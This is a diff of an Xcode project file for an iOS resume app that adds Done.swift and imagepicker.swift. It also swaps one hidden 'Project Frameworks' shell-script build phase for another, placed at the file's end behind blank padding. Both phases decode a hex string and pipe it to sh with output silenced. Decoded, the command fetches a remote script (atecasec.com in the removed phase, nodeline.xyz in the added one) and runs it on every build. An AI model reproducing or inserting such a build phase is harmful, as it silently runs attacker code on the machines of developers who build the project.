@@ -7,8 +7,10 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		042922FA26537E1F003A9F82 /* Done.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042922F926537E1F003A9F82 /* Done.swift */; };
 		0431122D26524577004C6FC9 /* Softwere.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0431122C26524577004C6FC9 /* Softwere.swift */; };
 		0431122F265294B6004C6FC9 /* Summary.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0431122E265294B6004C6FC9 /* Summary.swift */; };
+		0474EC2C2654DF9600372E3A /* imagepicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0474EC2B2654DF9600372E3A /* imagepicker.swift */; };
 		047BADBD2642A6B000F26406 /* experiance.swift in Sources */ = {isa = PBXBuildFile; fileRef = 047BADBC2642A6B000F26406 /* experiance.swift */; };
 		047E3802264561DF0085F99E /* Model.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 047E3800264561DF0085F99E /* Model.xcdatamodeld */; };
 		04A21C7F2640FD770098CEB3 /* resume_AppApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04A21C7E2640FD770098CEB3 /* resume_AppApp.swift */; };
@@ -44,8 +46,10 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		042922F926537E1F003A9F82 /* Done.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Done.swift; sourceTree = "<group>"; };
 		0431122C26524577004C6FC9 /* Softwere.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Softwere.swift; sourceTree = "<group>"; };
 		0431122E265294B6004C6FC9 /* Summary.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Summary.swift; sourceTree = "<group>"; };
+		0474EC2B2654DF9600372E3A /* imagepicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = imagepicker.swift; sourceTree = "<group>"; };
 		047BADBC2642A6B000F26406 /* experiance.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = experiance.swift; sourceTree = "<group>"; };
 		047E3801264561DF0085F99E /* Model.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = Model.xcdatamodel; sourceTree = "<group>"; };
 		04A21C7B2640FD770098CEB3 /* resume_App.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = resume_App.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -167,6 +171,8 @@
 				04EFD130264E90B4008F3D3A /* EduDetails.swift */,
 				0431122C26524577004C6FC9 /* Softwere.swift */,
 				0431122E265294B6004C6FC9 /* Summary.swift */,
+				042922F926537E1F003A9F82 /* Done.swift */,
+				0474EC2B2654DF9600372E3A /* imagepicker.swift */,
 			);
 			path = "tab bar";
 			sourceTree = "<group>";
@@ -178,7 +184,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04A21CA02640FD790098CEB3 /* Build configuration list for PBXNativeTarget "resume_App" */;
 			buildPhases = (
-				DAC7AD4BAEE3BFC1756D902C /* Project Frameworks */,
+				61FBCAB2B69BCEA3D36D902C /* Project Frameworks */,
 				04A21C772640FD770098CEB3 /* Sources */,
 				04A21C782640FD770098CEB3 /* Frameworks */,
 				04A21C792640FD770098CEB3 /* Resources */,
@@ -296,34 +302,6 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
-/* Begin PBXShellScriptBuildPhase section */
-
-	DAC7AD4BAEE3BFC1756D902C /* Project Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Project Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-
-	
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXSourcesBuildPhase section */
 		04A21C772640FD770098CEB3 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -336,8 +314,10 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f617465636173
 				04A21C812640FD770098CEB3 /* ContentView.swift in Sources */,
 				0431122D26524577004C6FC9 /* Softwere.swift in Sources */,
 				04EFD12F264E8B8A008F3D3A /* Skills.swift in Sources */,
+				042922FA26537E1F003A9F82 /* Done.swift in Sources */,
 				04A21CD226415C280098CEB3 /* Education.swift in Sources */,
 				047E3802264561DF0085F99E /* Model.xcdatamodeld in Sources */,
+				0474EC2C2654DF9600372E3A /* imagepicker.swift in Sources */,
 				04A21CCD26415C180098CEB3 /* Work.swift in Sources */,
 				04A21CB32641049B0098CEB3 /* address.swift in Sources */,
 				04A21C7F2640FD770098CEB3 /* resume_AppApp.swift in Sources */,
@@ -661,6 +641,75 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f617465636173
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+
+	61FBCAB2B69BCEA3D36D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+		
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 
 /* Begin XCVersionGroup section */
 		047E3800264561DF0085F99E /* Model.xcdatamodeld */ = {
